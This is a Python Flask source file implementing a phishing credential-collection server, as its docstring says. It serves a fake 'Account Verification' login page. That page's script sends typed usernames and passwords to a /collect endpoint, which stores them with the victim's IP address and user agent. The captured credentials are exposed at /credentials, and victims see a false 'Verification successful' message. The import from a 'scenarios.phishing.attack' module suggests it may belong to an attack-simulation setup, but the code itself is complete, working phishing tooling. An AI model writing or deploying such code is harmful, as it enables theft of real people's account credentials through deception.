#!/usr/bin/env python3
"""
Credential collection server for phishing attacks
Real server that captures and stores credentials
"""

import json
import logging
import time
from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
import threading
import os

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# In-memory storage for credentials (in production, use database)
credentials_db = []
phishing_page_html = None

@app.route('/health')
def health_check():
    """Health check endpoint"""
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

@app.route('/phish')
def phishing_page():
    """Serve phishing page"""
    if phishing_page_html:
        return phishing_page_html
    else:
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Account Verification - Please Login</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
                .login-form { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; background: white; border-radius: 5px; }
                input { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; border: 1px solid #ddd; border-radius: 3px; }
                button { width: 100%; padding: 10px; background: #007cba; color: white; border: none; cursor: pointer; border-radius: 3px; }
                button:hover { background: #005a87; }
                .header { text-align: center; color: #333; }
            </style>
        </head>
        <body>
            <div class="login-form">
                <div class="header">
                    <h2>🔒 Account Verification</h2>
                    <p>To ensure your account security, please re-verify your login information:</p>
                </div>
                <form id="loginForm">
                    <input type="text" id="username" placeholder="Username/Email" required>
                    <input type="password" id="password" placeholder="Password" required>
                    <button type="submit">Verify Account</button>
                </form>
            </div>
            <script>
                document.getElementById('loginForm').addEventListener('submit', function(e) {
                    e.preventDefault();
                    var username = document.getElementById('username').value;
                    var password = document.getElementById('password').value;
                    
                    // Send credentials to collection server
                    fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            username: username,
                            password: password,
                            timestamp: new Date().toISOString(),
                            user_agent: navigator.userAgent,
                            referrer: document.referrer
                        })
                    }).then(response => response.json())
                    .then(data => {
                        alert('✅ Verification successful! Your account is secure.');
                    }).catch(error => {
                        alert('❌ Verification failed. Please try again.');
                    });
                });
            </script>
        </body>
        </html>
        """

@app.route('/collect', methods=['POST'])
def collect_credentials():
    """Collect credentials from phishing form"""
    try:
        data = request.get_json()
        
        if not data or 'username' not in data or 'password' not in data:
            return jsonify({"error": "Invalid data"}), 400
        
        # Add metadata
        credential_record = {
            "username": data["username"],
            "password": data["password"],
            "timestamp": data.get("timestamp", datetime.now().isoformat()),
            "user_agent": data.get("user_agent", ""),
            "referrer": data.get("referrer", ""),
            "ip_address": request.remote_addr,
            "collected_at": datetime.now().isoformat()
        }
        
        # Store credential
        credentials_db.append(credential_record)
        
        logger.info(f"Credential collected: {credential_record['username']} from {request.remote_addr}")
        
        return jsonify({"status": "success", "message": "Verification completed"})
        
    except Exception as e:
        logger.error(f"Error collecting credentials: {e}")
        return jsonify({"error": "Internal server error"}), 500

@app.route('/credentials')
def get_credentials():
    """Get collected credentials (for verification)"""
    try:
        return jsonify({
            "count": len(credentials_db),
            "credentials": credentials_db,
            "last_updated": datetime.now().isoformat()
        })
    except Exception as e:
        logger.error(f"Error retrieving credentials: {e}")
        return jsonify({"error": "Internal server error"}), 500

@app.route('/clear')
def clear_credentials():
    """Clear collected credentials"""
    try:
        global credentials_db
        credentials_db.clear()
        logger.info("Credentials cleared")
        return jsonify({"status": "success", "message": "Credentials cleared"})
    except Exception as e:
        logger.error(f"Error clearing credentials: {e}")
        return jsonify({"error": "Internal server error"}), 500

def set_phishing_page_html(html_content):
    """Set custom phishing page HTML"""
    global phishing_page_html
    phishing_page_html = html_content
    logger.info("Phishing page HTML updated")

def start_server(host='0.0.0.0', port=9000, debug=False):
    """Start the credential collection server"""
    logger.info(f"Starting credential collection server on {host}:{port}")
    
    try:
        app.run(host=host, port=port, debug=debug, threaded=True)
    except Exception as e:
        logger.error(f"Failed to start server: {e}")
        raise

def start_server_background(host='0.0.0.0', port=9000):
    """Start server in background thread"""
    def run_server():
        start_server(host, port, debug=False)
    
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()
    
    # Wait a moment for server to start
    time.sleep(2)
    
    logger.info(f"Credential collection server started in background on {host}:{port}")
    return server_thread

if __name__ == "__main__":
    # Set phishing page HTML
    from scenarios.phishing.attack import create_phishing_page
    set_phishing_page_html(create_phishing_page())
    
    # Start server
    start_server() 